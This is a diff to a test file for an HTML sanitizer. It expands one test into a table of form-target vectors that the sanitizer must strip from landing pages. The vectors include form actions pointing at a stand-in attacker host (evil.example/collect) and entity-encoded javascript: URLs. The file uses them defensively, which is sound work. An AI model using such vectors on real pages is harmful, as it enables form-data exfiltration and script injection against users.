@@ -33,15 +33,52 @@ test.describe('HTML sanitization regressions', () => {
     expect(sanitized).not.toContain('onclick');
   });
 
-  test('strips landing page action and formaction attributes', () => {
-    const sanitized = sanitizeLandingPageHtml(
-      '<form action="https://evil.example/collect"><button formaction="javascript:alert(1)" type="submit">Send</button></form>'
-    );
+  const landingFormTargetVectors = [
+    {
+      name: 'external targets',
+      action: 'https://evil.example/collect',
+      formaction: 'https://evil.example/override',
+      blocked: 'evil.example',
+    },
+    {
+      name: 'relative targets',
+      action: '/__blocked-landing-form-submit__',
+      formaction: '../override',
+      blocked: '/__blocked-landing-form-submit__',
+    },
+    {
+      name: 'protocol-relative targets',
+      action: '//evil.example/collect',
+      formaction: '//evil.example/override',
+      blocked: '//evil.example',
+    },
+    {
+      name: 'encoded unsafe targets',
+      action: '&#x6a;avascript:alert(1)',
+      formaction: 'java&#x73;cript:alert(2)',
+      blocked: 'javascript:',
+    },
+  ];
 
-    expect(sanitized).toContain('<form>');
-    expect(sanitized).toContain('<button type="submit">Send</button>');
+  for (const vector of landingFormTargetVectors) {
+    test(`keeps landing forms inert by unwrapping ${vector.name}`, () => {
+      const sanitized = sanitizeLandingPageHtml(
+        `<form action="${vector.action}" method="post"><button formaction="${vector.formaction}" type="submit">Send</button></form>`
+      );
+
+      expect(sanitized).toContain('<button type="submit">Send</button>');
+      expect(sanitized).not.toContain('<form');
+      expect(sanitized).not.toContain('action=');
+      expect(sanitized).not.toContain('formaction');
+      expect(sanitized.toLowerCase()).not.toContain(vector.blocked.toLowerCase());
+    });
+  }
+
+  test('does not add a default landing page form target', () => {
+    const sanitized = sanitizeLandingPageHtml('<form method="post"><input name="email"></form>');
+
+    expect(sanitized).toContain('<input name="email">');
+    expect(sanitized).not.toContain('<form');
     expect(sanitized).not.toContain('action=');
-    expect(sanitized).not.toContain('formaction');
-    expect(sanitized).not.toContain('javascript:');
   });
 });
